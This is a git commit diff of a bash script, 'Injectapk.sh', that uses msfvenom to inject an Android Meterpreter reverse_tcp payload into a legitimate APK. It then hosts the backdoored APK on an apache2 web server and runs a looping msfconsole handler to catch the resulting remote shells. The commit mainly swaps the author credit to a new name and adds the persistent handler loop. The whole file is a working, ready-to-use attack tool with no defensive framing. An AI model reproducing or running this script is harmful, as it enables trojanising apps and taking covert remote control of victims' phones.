a517042674fad288186160adf6b6f5f6e2e06b80
Abu-side-dipon <121551706+Abu-side-dipon@users.noreply.github.com>
2024-03-03 02:30:42 +0600

    Injectapk.sh

--- Injectapk.sh
+++ Injectapk.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # Inject Payload in Android APK
-# Created By Mehedi Shakeel
+# Created By Abu Side Dipon
 clear
 cat << EOF
 
@@ -12,59 +12,59 @@ cat << EOF
  |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
             _/ |                                     
            |__/                 Version : 1.0
-                             Created By : Mehedi Shakeel
-                                YouTube : yt/mehedishakeel                   
+                             Created By : Abu Side Dipon
+                                YouTube : Abu Side Dipon                  
 
 EOF
 sleep 2
 
-
 #Checking For Root Access
 echo "Checking For Root User...."
 sleep 2
-if [[ $(id -u) -ne 0 ]] ; then 
-   echo "You are Not Root! Please Run as root" ; exit 1 ; 
-else echo "Checking For Requirement Packages.." ; 
+if [[ $(id -u) -ne 0 ]]; then 
+    echo "You are Not Root! Please Run as root" 
+    exit 1 
+else 
+    echo "Checking For Required Packages.." 
 fi
-
 
 #Checking and Installing Required Packages
 pkgs=(metasploit-framework wget default-jdk aapt apksigner apache2)
-for pkg in ${pkgs[@]}
-do
- sudo apt install $pkg
+for pkg in "${pkgs[@]}"; do
+    sudo apt install -y "$pkg"
 done
 sleep 2
 clear
 
-# Setup New APKTOOL 2.9.0 Manually  Note : DO NOT INSTALL APKTOOL WITH APT PACKAGE MANAGER
-
+# Setup New APKTOOL 2.9.0 Manually  Note: DO NOT INSTALL APKTOOL WITH APT PACKAGE MANAGER
 sudo mv apktool /usr/local/bin
 sudo mv apktool_2.9.0.jar /usr/local/bin
 chmod +x /usr/local/bin/apktool
 chmod +x /usr/local/bin/apktool.jar
 sudo apt install ./zipalign_8.1.0+r23-2_amd64.deb
-echo "Required Packages Has Been Installed Sucessfully"
+echo "Required Packages Have Been Installed Successfully"
 
-
-#Setting Up Variables For Injecting
+# Setting Up Variables For Injecting
 clear
 read -p "Set Your LHOST: " lhost
 read -p "Set Your LPORT: " lport
-echo  "APK Files You Have :" *.apk
+echo "APK Files You Have :" *.apk
 read -p "Write Clean APK Name: " capk
 read -p "Write the Name For Bind APK: " bapk
 clear
 
-#Injecting Payload Into APK
+# Injecting Payload Into APK
 echo "Injecting Payload into Your APK"
-msfvenom -x $capk -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o $bapk
+msfvenom -x "$capk" -p android/meterpreter/reverse_tcp lhost="$lhost" lport="$lport" -o "$bapk"
 
-#Enabling Web Server and Add Payload
+# Enabling Web Server and Adding Payload
 sudo service apache2 start
-sudo cp $bapk /var/www/html/
-echo "Visit To : http://$lhost/$bapk"
+sudo cp "$bapk" /var/www/html/
+echo "Visit: http://$lhost/$bapk"
 echo "Ready to Hack!"
 
-#Starting Msfconsole Handler
-msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
+# Starting Msfconsole Handler in a Loop
+while true; do
+    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; set SessionTimeout false; exploit;"
+    sleep 5  # Wait for 5 seconds before restarting the handler
+done
